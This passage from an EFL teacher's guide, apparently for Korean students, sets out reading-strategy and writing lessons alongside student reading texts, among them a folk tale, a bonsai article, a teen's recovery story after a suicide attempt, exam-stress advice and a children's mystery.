(Wired, National Geographic, The Economist etc.). Ask students 
to identify the probable vocabulary areas that may be used in 
the example article. Explain the importance of activating 
vocabulary by first quickly glancing at the text to be read. 
This idea is very important, as the brain will begin to focus 
on related concepts thus preparing the student for what is to 
be read. Point out that by using all of these clues (i.e. 
&quot;chunking&quot;, part of speech, logical deduction, vocabulary 
activation), students can arrive at a much fuller 
understanding of difficult texts - even if they do not 
understand each word. Have students divide into small groups 
and complete the worksheet. 

Reading Clues Worksheet:

1.	Deduction - What is the sentence about? Which words does 
the unknown word seem to relate to? 
2.	Part of Speech - Which part of speech is the unknown 
word? Is it a verb, noun, preposition, adjective, time 
expression or something else? 
3.	Chunking - What do the words around the unknown word(s) 
mean? How could the unknown word(s) relate to those 
words? - This is basically deduction on a more local 
level. 
4.	Vocabulary Activation - When quickly skimming through the 
text, what does the text seem to be about? Does the 
layout (design) of the text give any clues? Does the type 
of book give any clues to what the text might be about? 
Which words can you think of that belong to this 
vocabulary category? 

Make logical guesses about the meaning of the unknown words in 
the following paragraph. 

Jack quickly entered the didot and cleaned the various 
misturaes he had been using to repair the wuipit. He had often 
thought that this job was extremely yullning. However, he had 
to admit that this time things seemed to be a bit easier. When 
he finished, he put on his redick and went back to the study 
to relax. He took out his favourite pipe and settled into the 
beautiful new pogtry. What a fantastic schnappy he had made 
when he had bought the pogtry. Only 300 yagmas! 

What could a 'didot' be? 
What part of speech is 'misturaes'? 
If Jack used the 'misturaes' to repair the 'wuipit' what do 
you think the 'mistraes' must be? 
What could 'yulling' mean? - What part of speech is often used 
with an ending '-ing '? 
Which synonym could be used for ' yulling '? 
*	fun 
*	difficult 
*	expensive 
What type of things do you put on? 
Based on the above question, what kind of thing must a 
'redick' be? 
Is a 'pogtry' used inside or outside? 
Which words let you know that the 'pogtry' was cheap? 
What must 'yagmas' be? 
*	Clothes 
*	Cigarette type 
*	Type of money

Summary (5 minutes):
The teacher and students should talk about the usefulness of 
the strategy. The teacher should encourage the students to use 
the strategy both while reading texts in Korean as well as 
English. Students should be reminded to think while they read.

===Extensive Reading===

Objectives:
To introduce a reading strategy that will increase the 
student’s understanding of texts. 
Students will understand the importance of making connections 
and thinking about the text while they read. Students will be 
shown the importance of scanning texts to find answers to 
questions. Students will be given the opportunity to use the 
reading strategy. Students will write a journal entry on the 
effectiveness of the strategy.
Materials needed:
*	Teachers will need reading material for the students to 
teach the reading strategy. The teacher will need enough 
newspaper pages for each student to get one (there should 
2 or 3 complete articles on each page). One is also 
needed for the teaching of the strategy (each student 
needs a copy of this one, as well as one for the 
teacher). This is important for the strategy.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Arrange the tables in such a way that all the newspaper pages 
can be displayed and read at once.

Warm Up (10 minutes):
Teachers should question the students about their reading 
habits…
*	what they read
*	when they read
*	why they read
Ask the students if they are good readers. Also, you should 
ask about their newspaper reading habits. Find out how often 
and how the students read the newspaper.

Ask a question based on the ‘teaching newspaper’. The question 
should be one that is easily found through a quick scan of the 
paper. The student who finds the answer first should be 
awarded.

Try to go through a number of questions. Then have one of the 
students come up with a question. The question should be 
written on the board and the class given the opportunity to 
answer the question.

Activity (30 minutes):
Each student is given one of the articles and asked to come up 
with two questions based on the articles on their page. The 
question must be one that can only be answered by reading the 
article. The students give the newspaper page and the 
questions to the teacher. Write all of the questions on the 
board. The newspaper pages are laid out on the tables so that 
all of them can be read easily. The students then need to find 
the answers to each of the questions on board.

The activity ends when the first student answers all the 
questions.

Summary (5 minutes):
Discuss the usefulness of the strategy. Encourage the students 
to use the strategy both while reading texts in Korean as well 
as English. The students should share their strategies for 
finding which page had the right articles. Students should be 
reminded to use this strategy in their daily reading.



What I know/What I want to Know

Objectives:
To introduce a reading strategy that will increase the 
student’s understanding of texts. 
Students will understand the importance of making connections 
and thinking about the text while they read. Students will be 
shown the importance of scanning texts to find answers to 
questions. Students will be given the opportunity to use the 
reading strategy. Students will write a journal entry on the 
effectiveness of the strategy.
Materials needed:
*	Teachers will need reading material for the students to 
teach the reading strategy. The teacher will need one 
more text than the number of students in the class. One 
is needed for the teaching of the strategy and the others 
for the students to practice. Room should be provided 
next to the text for students to write what they know 
about the topic and some questions they would like 
answered about the topic. The texts should have a number 
of short paragraphs. This is important for the strategy.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Teachers should question the students about their reading 
habits…
*	what they read
*	when they read
*	why they read

Ask the students if they are good readers. Continue by asking 
the students about their favorite things, sports, or 
activities. Enquire as to whether the students have read 
anything about their favorite things. Students should be 
encouraged to share what they know about their favorite 
things. Make it clear that the students know a lot of things.

Activity (30 minutes):
Hand out the first article (one to each student). Elicit from 
the class what they know about the topic of the article. What 
they know should be written on the board under the heading—
“What We Know”. Then gather some questions from the class 
about what they would like to learn about the topic in the 
article. The questions should be put under the heading—“What 
We Want to Know”.

The students read the first article underlining all the things 
they find that they knew. The students need to circle the 
answers they find to their questions.

The class discusses what they found in the articles and about 
the answers they found. If there are any answers that were not 
found, the class can ask the teacher for help in finding the 
answers.

Hand out the second article (each group should get a different 
article). The students should make their own lists of things 
they know and questions they want answered. The students 
should read the article and mark it the same way they did 
before and then share with the other groups what they have 
learned. New groups should be formed so that each group has 
one representative for each article.

Answer any questions that the students have after they have 
finished their readings.

Summary (5 minutes):
Discuss the usefulness of the strategy. Encourage the students 
to use the strategy both while reading texts in Korean as well 
as English. Students should be reminded to think while they 
read.



===Questioning/Predicting===

Objectives:
To introduce a reading strategy that will increase the 
student’s understanding of texts. 
Students will understand the importance of making connections 
and thinking about the text while they read. Students will be 
given the opportunity to use the reading strategy. Students 
will write a journal entry on the effectiveness of the 
strategy.
Materials needed:
*	Teachers will need reading material for the students to 
teach the reading strategy. Two different texts will be 
needed. One is needed for the teaching of the strategy 
and one for the students to practice. Room should be 
provided next to the text for students to write their 
questions and predictions in the margin. The texts should 
have a number of short paragraphs. This is important for 
the strategy.
*	A short piece of text is needed for the warm-up.

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Teachers should question the students about their reading 
habits…
*	what they read
*	when they read
*	why they read
Ask the students if they are good readers. Hand out the short 
text and then ask the students to read it. Ask the students to 
turn over the article and then ask them to summarize it 
verbally to the class. Regardless of the students’ ability to 
summarize, the teacher should tell the students that their 
comprehension can be improved and that the teacher can help 
them.

Activity (30 minutes):
Hand out one of the texts and explain the reading strategy:

The question and prediction strategy is very simple. The 
students will alternately create questions or make predictions 
about the paragraph they are going to read. The first step is 
for the students to read the title of the text and make a 
prediction about what the first paragraph will tell them. 
After reading the first paragraph, they write down a question 
they want answered by the text. The student reads the second 
paragraph. After reading the second paragraph, they make a 
prediction about the third paragraph. They read the third 
paragraph and then write another question that they want the 
article to answer. This format continues as the students read 
the text.

Go through the first text together with the class. Check if 
the students understand the strategy. Give the students the 
second text and have them practice the strategy as an 
independent exercise.

Summary (5 minutes):
Talk about the usefulness of the strategy. Encourage the 
students to use the strategy both while reading texts in 
Korean as well as English. Students should be reminded to 
think while they read.

*	why they read
Ask the students if they are good readers. Hand out the short 
text and ask the students to read it. Ask the students to turn 
over the article and then ask them some questions (involving 
the four types of questions). The teacher should remark how 
these are the types of questions used on reading comprehension 
tests. Regardless of the students’ ability to answer the 
questions, the teacher should tell the students that their 
comprehension can be improved and that the teacher can help 
them.

Activity (30 minutes):
Hand out one of the texts and explain the reading strategy:

Question-Answer Relationship or QAR (Raphael, 1982; 1986) is a 
great way to help students figure out how to go about 
answering questions based on a given text. Often students 
assume that every question’s answer is directly stated 
somewhere in the text, if only they look hard enough. Thus, 
many students spend far too much time looking for answers that 
are not “right there,” and their frustration mounts. Teaching 
our students the four basic question-answer relationships is a 
valuable strategy that will help them to understand the 
different types of questions and know how to effectively and 
efficiently approach the text based on the different question 
types.
Helping students to analyze the question-answer relationships 
will enable them to become skillful at analyzing the types of 
questions that they are typically asked to respond to when 
reading a text. The four question-answer relationships are as 
follows:

1.	Right There Questions: “Right There” questions require 
you to go back to the passage and find the correct 
information to answer the question. These are sometimes 
called literal questions because the correct answer can 
be found somewhere in the passage. “Right There” 
questions sometimes include the words, “According to the 
passage…” “How many…” “Who is…” “Where is…” “What is…”

2.	Think and Search Questions: “Think and Search” question 
usually require you to think about how ideas or 
information in the passage relate to each other. You will 
need to look back at the passage, find the information 
that the question refers to, and then think about how the 
information or ideas fit together. “Think and Search” 
questions sometimes include the words, “The main idea of 
the passage…” “What caused…” “Compare/contrast…”

3.	Author and You Questions: “Author and You” questions 
require you to use ideas and information that is not 
stated directly in the passage to answer the question. 
These questions require you to think about what you have 
read and formulate your own ideas or opinions. “Author 
and You” questions sometimes include the words, “The 
author implies…” “The passage suggests…” “The speaker’s 
attitude..,”
 
4.	On My Own Questions: “On My Own” questions can be 
answered using your background knowledge on a topic. This 
type of question does not usually appear on tests of 
reading comprehension because it does not require you to 
refer to the passage. “On My Own” questions sometimes 
include the words, “In your opinion…” Based on your 
experience…” “Think about someone/something you know…”

Go through the first text together with the class. Check if 
the students understand the strategy. Give the students the 
second text and have them practice the strategy as an 
independent exercise.

Summary (5 minutes):
Talk about the usefulness of the strategy. Encourage the 
students to use the strategy both while reading texts in 
Korean as well as English. Students should be reminded to 
think while they read.



===Student Workbook Reading Material===
Kong Ming and the 10,000 Arrows 
Stephen Suen (1993 - Pres.)

A long time ago, in China, the country was separated into 
three kingdoms, each kingdom fighting for full control of 
China. In one state, there was a general named Zhou Yu, who 
was planning to burn his enemy's ships with fiery arrows. But 
their supplies were low, and they were surrounded by enemies 
so they couldn't re-supply. How would his army get enough 
arrows to burn the ships?

In Zhou Yu's camp there was a military strategist named Kong 
Ming. He was one of China's greatest war strategists, and was 
known for his cleverness. But Zhou Yu did not like Kong Ming 
very much, and did not want to admit that Kong Ming was the 
smarter of the two. So he called Kong Ming over to his tent.

&quot;Kong Ming, if you really are so clever, I want you to get me 
10,000 arrows in a week -- or I shall have you beheaded!&quot; Zhou 
Yu demanded loudly. &quot;Now get out of my sight!&quot;

Kong Ming smiled. &quot;I'll get the arrows in 3 days. Just let me 
borrow 20 boats.&quot;

After Kong Ming left Zhou Yu's tent, Zhou Yu appointed one of 
his personal guards to follow Kong Ming and report his actions. 
 
The first day, Kong Ming spent the whole day drinking wine 
with his friends. The same thing happened the second day.  
 
&quot;What is this?&quot; Zhou Yu demanded, &quot;All he does with his 
precious time is drink. He will never be able to get those 
10,000 arrows!&quot;

On the night of the third day, Kong Ming ordered his men to 
build men made of straw, and post them up around each boat. 
Then the 20 boats sailed toward the enemy fortress. 

The next day Kong Ming was ordered to Zhou Yu's tent, where a 
guard was ready with a large sword used for execution. 

&quot;Wait,&quot; Kong Ming chuckled, and his men brought in the 10,000 
arrows. Zhou Yu was in total shock, and coughed out blood 
because he was so angry.

&quot;How -- how?&quot; Zhou Yu asked.

&quot;I asked my men to post up fake soldiers made of straw on the 
boats, and when the boats sailed into enemy territory, they 
were welcomed by the arrows. The arrows were caught in the 
straw men and my men sailed away with the 10,000 arrows,&quot; Kong 
Ming replied, and left the tent, victorious.

(Based on a tale from &quot;The Three Kingdoms.&quot;)


Bonsai

For many years the Chinese and Japanese have practiced the 
unusual hobby of making tiny trees. This hobby, called bonsai 
(bon - si), probably began in ancient China to show admiration 
for trees growing on mountains or cliffs. The gardeners 
appreciate how these trees have struggled under harsh growing 
conditions in order to survive. Because of strong wind, poor 
soil, and the need to root in tiny cracks, full-grown trees 
look small and twisted. Bonsai gardeners try to create trees 
that look like old twisted trees to honor such determination 
and will to survive.

To produce these tiny trees, gardeners select a tree, such as 
an evergreen, maple, larch, or beech. The gardeners put seeds, 
cuttings, or a very young sapling in a tray made of shallow 
earthenware. The future tree needs to be placed off-center so 
that it can be more easily pruned, or trimmed and cut, into an 
irregular shape. 

Once the tree is planted, the gardeners shape it by wrapping 
branches with wire to force their growth in a certain 
direction. In this way, the gardeners can make almost any 
shape they like over time. One branch can spread sideways, for 
example. Other branches can stay short and close to the dwarf 
trunk. 

Once the tree is established, gardeners must also control the 
rate of growth. They do this by sometimes re-potting the 
bonsai. Each time, they skillfully prune just the right roots 
to reduce growth and produce the tiny, twisted branches. 

Fully grown bonsai, which would normally be 15 or 20 foot 
trees, range from barely two inches to an average of two feet. 
They take at least five years to create. With this much time 
and care required, it's not surprising that the gardener is 
proud of the grown bonsai as a work of art. It honors those 
qualities that have enabled trees in nature to survive by 
barely hanging on.


Bullying

It’s been a year now since I tried to commit suicide, but it 
seems like much longer because I have grown so much since then. 
I started feeling depressed when I was about 14. I was getting 
bullied in school and had been for a while. I used to hate 
school and every morning I had a fight with my mum because I 
didn't want to go, at the time she did not know how I felt or 
that I was getting bullied because I didn't tell her, I didn't 
tell anyone. 

I don't know why I got bullied, (does anyone) I suppose they 
saw me as an easy target because I was quiet and I liked 
different music to them. While they were all listen to pop 
music like &quot;Spice Girls&quot; and &quot;Steps&quot; I was listening to rock 
music like &quot;Guns n Roses&quot; and &quot;Oasis&quot;, but this should not 
have been a problem because I did not criticizes their taste 
in music, in fact I didn't give them any reason to bully me.

I was not just the same people bullying me all the time it was 
like different people once one group of friends in the school 
got fed up picking on me, another would start I just couldn't 
cope anymore, I thought I was alone and started to believe 
what the bullies were saying, that I was &quot;ugly&quot; an &quot;a freak&quot;.

Eventually I had had enough and one day after school I went 
home feeling really depressed, I just went straight up to my 
room and sat and cried for hours and hours, I felt I that no 
one cared for me and there was no point in living and about 9 
o'clock that night my mum and dad went out, my brothers were 
in friends so I was in the house alone. I sat and thought for 
a while, I was really confused I just sat thinking and 
dreading the fact that I would have to go to school tomorrow, 
then something just clicked and I thought am not going to 
school tomorrow or ever, so I went downstairs, I did not 
really think about what I was doing at the time I was just 
looking for an easy way out, but unfortunately I chose the 
wrong way.

Eventually I had had enough and one day after school I went 
home feeling really depressed, I just went straight up to my 
room and sat and cried for hours and hours, I felt I that no 
one cared for me and there was no point in living and about 9 
o'clock that night my mum and dad went out, and my brothers 
were with friends so I was in the house alone. I sat and 
thought for a while, I was really confused I just sat thinking 
and dreading the fact that I would have to go to school 
tomorrow, then something just clicked and I thought am not 
going to school tomorrow or ever, so I went downstairs, I did 
not really think about what I was doing at the time I was just 
looking for an easy way out, but unfortunately I chose the 
wrong way.

I went into the medicine cabinet and just grabbed as many 
tablets as I could find and swallowed them. I went back 
upstairs and lay in bed, I had never felt so scared in my life, 
I just lay there numb crying and regretting what I had just 
done I started thinking about mum and dad and how they would 
feel if I died, but I was too scared to tell anyone so I fell 
asleep at about 5 o'clock in the morning and mum woke me up at 
7, for a moment I forgot what I had done and then realized, I 
felt so sick I vomited a few times but still didn't tell 
anyone, I just got ready and went to school, as soon as I 
walked into my classroom my teacher asked me if I was ok, I 
started crying and walked out, I went to my head of year and 
told her everything, because at this point I was so scared 
that I was going to die. 

My mum and dad were called and I was taken to hospital, 
everything happened so quick in the hospital they rushed me in 
and did all kind of blood and other tests and asked me loads 
and loads of questions about what I had taken and how many and 
why? When the results come back they said that I was very 
lucky, and that if I wouldn't have told anyone I might have 
died, then they said that there was nothing they could do but 
wait until the tablets cleared out of my system but they said 
I would be OK because I did not take very many parocetamol 
(which is what kills your organs) and they kept me in for a 
few days until they were sure that it was out of my body.

I regret so much trying to kill myself and would advice anyone 
against it because it does not solve anything it is much 
better if you talk about your problems and confront them, I 
realized this too late. Thinking back I can't believe I tried 
take my life because of bullies, I have shown them now that 
they can't get to me anymore because I know that I am better 
than them and with help from my family I am now a confident 
person.
 
I will be taking my GCSE's June of this year and I know that I 
will do well. I am now a different person and don't have time 
for bullies in my life even if they do say the occasional 
comment I just laugh and walk away because it is them that are 
freaks not me. I hope my story will convince someone that 
suicide is not the way out and it is better to talk about your 
problems with a friend or family or even a help line. There is 
hope, believe me. Just remember that you are a special, unique, 
worthwhile person and don't ever let anyone else tell you 
different.


Computers in the classroom

Kids are going all over the world without ever leaving their 
school. They are using their computers. A school in California 
could be the most wired school in America. They are wired to 
the Internet through their computers. 

Thirty students are able to use the Internet every day. The 
kids are between the grades of kindergarten and fifth grade. 
The teacher says that it is hard to get them away from the 
computers. They do not even want to go to recess. 

The Internet has opened the world to many people. Now students 
can go to any library on earth. They can get information. They 
can visit a child in another country. 

Laura Bacon likes to visit with other students. She's going to 
Peggy's page. Peggy is a school student in London, England. 
She put her own home page on the Internet. It includes 
pictures of Peggy, her school, her mom, dad and friends. You 
can send her email, too. 

A scientist helped to wire the school. He says, &quot;There is a 
plan to connect 12 thousand California schools to the 
Internet.&quot; 

Wiring schools in California will cost a lot of money. It 
needs to be done on volunteer effort or schools will not be 
able to afford it. They think that it will cost as much as 
fifty billion dollars. 

Some people say that the money should be spent on teachers 
instead of computers. While some people say that it would be 
worth it to wire all of the classrooms.


Handle exams with confidence.

Advice and help for all students. Learn how to avoid exam 
stress and tension, and how to revise and prepare for 
examinations.

For those of us who are studying at school or college, the 
time of exams is very stressful and difficult. Some people 
find exam time so bad they become ill, because:
*	They are afraid of failing. 
*	They are afraid of letting their parents and family down.
*	The hard work of study and reviewing* damages their 
health. (*learning again from your notes and books - 
going back over what you have studied) 

If exams are really making you ill, worried, or depressed, 
don't hide your feelings. Talk to someone about it. In some 
cultures, people think it is wrong to share their feelings and 
worries with others. But this is the only way to get help! 

In Britain, there is a saying, 'A problem shared is a problem 
halved.' So you must find someone to talk to about these 
problems. 

Maybe you can speak to a friend, or someone in your family (or 
teachers at your place of study, or a doctor). If one person 
doesn't help you, ask someone else. If you feel very desperate, 
look at our suicide page, which also gives a link to 
BEFRIENDERS telephone numbers in different countries. They 
provide someone you can talk to, in confidence. Also look at 
our page on fear and worry. 

Different people deal with exams in different ways:
Peter, 17,about to take exams in chemistry, biology and math, 
says &quot;different people deal with exams in different ways&quot;. 
&quot;There is so much pressure placed on you to pass exams. I feel 
I would be letting my parents and my brother down if I didn't 
do well.&quot; His answer to the problem is: &quot;Stay on top of the 
work.&quot; He recommends, &quot;I don't just sit there and read. I try 
to condense (make short) my notes, by making new notes of the 
important points. Then I can read through it faster in the 
last few days.&quot; 

Louise, 18, taking English Literature, media studies and 
theatre studies, says, 
&quot;I review one subject for an hour, then move to another 
subject for an hour, and carry on like that for as long as I 
can.&quot; 

HOW TO GET THROUGH EXAMS
Here are 10 top tips from educational psychologists: 
*	Get help: ask a teacher or tutor about how to revise, and 
exam skills - how to work when you are in an exam. 
*	Take short rests during your time of work and revision. 
If your mind is tired, it will not remember well. 
*	Plan your work: study at times when you know you will 
work at your best. 
*	Stay healthy: get enough sleep, eat sensibly. 
*	Exercise: you need exercise to work well. Walk, run, play 
sports - whatever you enjoy. 
*	Be positive: stop thinking about the future and failing. 
*	Do your best: no one can do more than this. 
*	Be alert: if you feel ill, talk to someone about your 
worries. 
*	But don't be too relaxed! Some stress over exams makes 
you work hard for them. 
*	Be sensible: if it upsets you to talk to your friends 
about an exam when it is finished, don't do it! In fact, 
don't even think about the exam you have finished. What 
is done is done. You cannot change what you have written! 

To this advice, we would add: 
If you are studying in the evening, don't go straight to bed 
afterwards. Your mind will still be 'going round and round' - 
thinking too much. Do something else, maybe walk or get 
exercise. Choose something that will relax you, and make you 
think of other things. 


The Missing Michael Jordan Shoes
By Lauren

&quot;Whaaaaaaaaaaaa, boo hoo!&quot; Hayden cried as he sat on his front 
porch steps. Just then Benji, his best friend, rode up on his 
scooter.

&quot;Hey, Benji,&quot; Hayden sobbed.

&quot;What's wrong, Hayden?&quot; Benji asked.

&quot;I can't find my Michael Jordan shoes. They were right here on 
the rug! I put them there after school,&quot; Hayden replied. 

&quot;Did you look for them?&quot; Benji asked inquisitively.

&quot;Yeah, all over. I couldn't find them anywhere!&quot; Hayden 
responded, trying to choke back all the sobbing. 

Just then, Billy and Penelope rode up on their bikes. &quot;What's 
shaking, boys?&quot; Billy asked.

&quot;Nothing much for me,&quot; Benji replied. &quot;But my bud, Hayden, 
here just got his favorite shoes stolen. Do you guys think you 
could help him, being detectives and all?&quot; 

&quot;Sure, yeah!&quot; Penelope exclaimed, glowing with delight.

&quot;We'd love to,&quot; Billy added.

&quot;Thanks, guys, but I don't even know who would've done it. I 
don't hate anyone,&quot; Hayden chimed in. His crying and sobbing 
was starting to stop.

Billy and Penelope hopped off their bikes, walked up the 
sidewalk and sat down on the porch. &quot;Well, we'll ask you a few 
questions in case anything comes to you.&quot;

&quot;Okay, what did the shoes look like?&quot; Billy asked starting the 
interview.

&quot;They were white and red, SIGNED BY MICHAEL JORDAN!&quot; Hayden 
cried, the sobbing resounding.
&quot;It's okay, all right, all right,&quot; Penelope said in a calm, 
soothing voice. &quot;Do you know anyone besides yourself that is a 
big fan of Michael Jordan?&quot;

&quot;Freddy, my other friend. I think he likes the Bulls,&quot; Hayden 
sighed.

&quot;Is there someone at school you know of that would have a 
grudge on you for something that you did? Like a play, project, 
a girlfriend?&quot; Billy said.

&quot;Oh, my goodness! Marti- GIRLS, YUCK! Anyway, Martino Jimenez 
is mad because I got the part of Peter Pan in our skits!&quot; 
Hayden yelled wildly, bouncing in his seat with excitement. 
&quot;But I don't know why he'd take my shoes. They probably smell 
horrible. But he knows they are the most precious thing I 
own!&quot;

&quot;Oh, how ironic. Here comes that nerd now!&quot; Benji said in an 
irritated voice.

Walking down the street was a tall boy with short pants, a 
sweater, glasses, hair to the side, and a big stack of books 
in his hands.

&quot;Why, hello, all you-unfine people. Just doing a bit of 
research,&quot; Martino called in an unpleasant, high-pitched voice.

&quot;Oh, Martino! Come here, please!&quot; Penelope yelled in a mock 
voice of Martino's.

&quot;I was walking my dog, Tootsie, at the time his dumb shoes 
were stolen!&quot; Martino answered Billy's question.

&quot;Fine, you can go do your little bit of research,&quot; Billy 
called after the boy as he stalked off, &quot;but we'll be asking 
you a couple more questions tomorrow.&quot;

Just then, Hayden and Benji rode toward the house on their 
scooters with Freddy running behind.

&quot;We're back!&quot; Benji called. 

&quot;Freddy, we'd like to ask you a few questions about the 
situation,&quot; Penelope started.

&quot;Okay, shoot,&quot; Freddy replied in an exhausted, panting voice.

&quot;Where were you about an hour ago when this all started?&quot; 
Billy asked.

&quot;Hmm, I was watching the Bulls game at Ben's house. I can 
never get enough of those Bulls,&quot; Freddy said.

&quot;Who's your favorite player on the Bulls' team?&quot; Billy asked

&quot;Michael Jordan, of course. MJ's the greatest player there 
ever was! He's a legend! I'd do anything for his autograph,&quot; 
Freddy rambled on.

&quot;Anything?&quot; Penelope replied.

&quot;Definitely!&quot; he said.

The next day, Penelope, Billy, and Hayden stopped over at both 
of their houses.

&quot;We have two suspects, Freddy and Martino,&quot; Billy said as the 
three of them were strolling down the street.

&quot;It's definitely Freddy,&quot; Penelope stated confidently. &quot;He 
said he'd do anything for Michael Jordan's autograph.&quot;

&quot;But Freddy has been one of my best friends since kindergarten. 
He'd never take anything from me,&quot; Hayden protested.

&quot;Martino seemed kind of weird and suspicious. But Freddy 
seemed guiltier. It's a toss-up,&quot; Billy thought out loud.

&quot;They arrived at Freddy's house and rang the doorbell. Freddy 
answered the door.
&quot;Hey, Fred,&quot; Hayden said.

&quot;Hey,&quot; Freddy greeted him.

&quot;We're here to ask you a few more questions,&quot; Billy cut in.

&quot;All right,&quot; Freddy answered. &quot;But make it quick.&quot;

&quot;Okay, have you ever stolen anything?&quot; Penelope asked.

&quot;No! That's one of the worst things that anyone could do! I 
could go to jail for that,&quot; Freddy bellowed back.

&quot;Okay, okay, we get it,&quot; Billy said. &quot;Where were you yesterday 
at the time of the crime?&quot;
&quot;Ben's house! I told you that,&quot; Freddy replied.

&quot;Well, thanks, Freddy. I hope I can find my shoes,&quot; Hayden 
called, walking down the sidewalk.

&quot;They arrived at Martino's house some five minutes later. The 
three of them walked up to the door and knocked.

&quot;What now? Go away. I told you I didn't do it!&quot; Martino yelled, 
starting to swing the door shut.

&quot;We just want to ask you a couple of questions, Martino,&quot; 
Penelope said calmly, pushing the door back open.

&quot;What's all the racket about, Tino?&quot; a voice said softly from 
inside the house. Martino's little sister walked up to the 
door.

&quot;Go away, Bella!&quot; Martino screamed in reply.

&quot;Oh! Look at my friend's puppy! Isn't he so cute?&quot; Bella said, 
ignoring her brother.

&quot;Get that thing away! You know I'm allergic!&quot; Martino 
responded.

The three of them looked at each other.

&quot;Could you please give my shoes back? Why would you want to 
take them? Why did you?&quot;

How did they know that Martino took the shoes?

Answer:
Martin’s alibi was he was walking his dog at the time of the 
theft, but he’s allergic to dogs. 







==Writing==




===Hints===
A little every day…

Start a journal at home. Write a little every day. Don’t worry 
about spelling or grammar, but concentrate on getting you 
ideas down.

Start a dialogue journal with a friend. You write in it one 
day and then give it to your friend. They can respond to what 
you have written. It is like having a written conversation.

Try some timed writing. Sit down and try to write in English 
for 3 minutes. Don’t stop writing until your time is up. If 
you don’t know what to write, then write…”I don’t know what to 
write. I don’t know what to write….”

When you write, concentrate on how you connect your ideas. 
Making good connections is one for the keys to good writing.

A thesaurus is a great tool. It is a book to help you find new 
words for things you already know. Did you know that there are 
17 words that mean interesting?



===Group Story / Word Story===

Objectives:
The objectives of this lesson are to encourage quick thinking 
and to transpose those thoughts into written English. Students 
also gain experience in sentence structure and vocabulary 
acquisition.
Materials needed:
*	Blackboard
*	Student Workbook,
*	Pens / Pencils
*	Word Cards
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Photocopy the cards on the following pages. Cut them out and 
laminate them if possible. These are the cards that will build 
your deck of words. Have the students open their workbook to 
the writing section.

Warm Up (10 minutes):
The teacher chooses 3 cards from the deck of word cards and 
writes the words on the board. Instruct the students to make a 
sentence that contains all three of the words and write it in 
their workbook. Have each student read his or her sentence to 
the rest of the class. Correct any grammatical errors. It may 
be beneficial to choose the first three words rather than to 
rely upon chance.

Activity (30 minutes):
Tell the students that they are going to create a short story 
by repeatedly selecting 3 cards form the pack. The story will 
be 11 sentences long (including the sentence they already made 
in the warm up). 

Explain to the students the following points.
*	Stories may be nonsensical.
*	Enforcement of tenses.
*	This is not merely a collection of 11 sentences but a 
story that should flow from one sentence to the next.
*	The last 1 or 2 sentences should be devoted to ‘wrapping-
up’ the story.

Get the first student to take three cards from the pack and 
read them aloud to the rest of the class. Write the three 
words on the board and instruct the students to write a 
sentence, as before, in their workbook. Again, remind the 
students that this second sentence should have some 
relationship with the previous sentence. Continue until all 
eleven sentences are made and the story is complete. Get 
students to swap stories with the person next to them and read 
their partner’s story.

Summary (5 minutes):
Scan the produced stories and read some of the more creative 
or humorous ones to the class. Review the objectives of the 
lesson and conclude.

===Speech Writing===

Objectives:
Students will be shown a simple structure for creating a 
speech. The teacher will stress the use of the IRE idea (Idea, 
Reason, Example) and be given examples of the structure in 
action. In addition, students will be given the opportunity to 
write and perform a short oral presentation.
Materials needed:
*	Student workbook
*	Pens or pencils
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson

Warm Up (10 minutes):
The teacher will ask student opinion questions (What is your 
favorite sport? for example). As the students answer the 
teacher will elicit longer responses by asking for reasons and 
examples.

T: What sport do you like?
S: I like basketball. (This is the student’s idea.)
T: Why do you like basketball?
S: It is really fast. (This is the reason.)
T: What is fast about basketball?
S: The players have to pass the ball very quickly. (This is 
the example.)
T: So your answer is…I like basketball because the game is so 
fast. The players really have to pass the ball quickly. 
(Teacher summarized the three parts and strings them together.

The teacher should ask enough questions to give the students 
an idea of the basic structure that is to be used in the 
speech. This should take up about 10 minutes of the class.

Activity (30 minutes):
The Writing of the Speech (~20 minutes)

Students will be asked to write a speech on the topic—“What I 
like…”
The students will be asked to write an outline of the topic 
first using the following guideline:

Idea
Reason
Example
Reason
Example
Reason
Example
Conclusion

Students may choose to cut the number of reasons down to two 
and add an extra example for each if they choose.

More proficient students can be asked to put in connecting 
sentences between the pairs of reasons/examples.

The conclusion should be a re-stating of the first idea in a 
very firm and convincing way.

The Giving of the Speech (10 minutes)

Students will be asked to give their speech in front of the 
class.
Students should be reminded of a few simple speech-giving 
instructions.
*	Eye contact… students should make eye contact with each 
person in the room.
*	Pronunciation/Intonation… students should be careful to 
pronounce things very clearly.
*	Voice level… students should speak so that someone at the 
back of the room can hear them.
*	Voice speed… students should speak slower than usually.

Summary (5 minutes):
Students who wrote good speeches should be praised and class 
should be made aware of why that speech was so good. Students 
who gave good speeches should also be praised and the class 
should be made aware of why their speech sounded better than 
others. Students should be encouraged to use these new skills 
if they ever need to make a public speech.

===Folded Story===

Objectives:
Students will work on their use of connectives.
Students will construct a story using connectives.
Materials needed:
*	Pencils or pens
*	Blackboard
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Have each student remove a piece of paper from their workbook 
and fold it to create eight sections (like an accordion fan).

Warm Up (10 minutes):
Write a list of connectives on the board. The list should 
include: but, and, so then, suddenly, and then, and others of 
the teacher’s choice. The students will do the following 
activity.

Line the students up in front of the blackboard and tell them 
they need to write a sentence using one of the connectives. 
Each student can write only one word at a time. The sentence 
can be of any length. The students should write 2 or 3 
sentences depending on the available time.


Activity (30 minutes):
Tell the students to take out their folded papers and write 
the following words in each section, one per section.

One day
He said
She said
then
and
so
suddenly
finally

Tell the students to finish the first section…(e.g. One day 
John and Mary went to the zoo). After the students have 
finished their sentence they need to fold the section under so 
that it cannot be read. The students pass the paper to another 
student who writes the next section and folds the paper under 
again so it cannot be read. This continues until the eight 
sections have been filled. The paper returns to the original 
writer who then unfolds it and reads the story.

Note: Teachers should tell students to write their own story. 
After they write the eight headings, they should start 
thinking of the complete story and then write their own story 
each time the paper is passed. They should not try to figure 
out what others have written.

Summary (5 minutes):
Teacher should make brief remarks about the use of 
connectives. Have the students exchange stories and read them. 
If there is time read some of the best stories.




===Five Line Poem===

Objectives:
Students will be shown examples of five line poems, be 
encouraged to talk about the sample poems, and (both as a 
class and as individuals) create five line poems.
Materials needed:
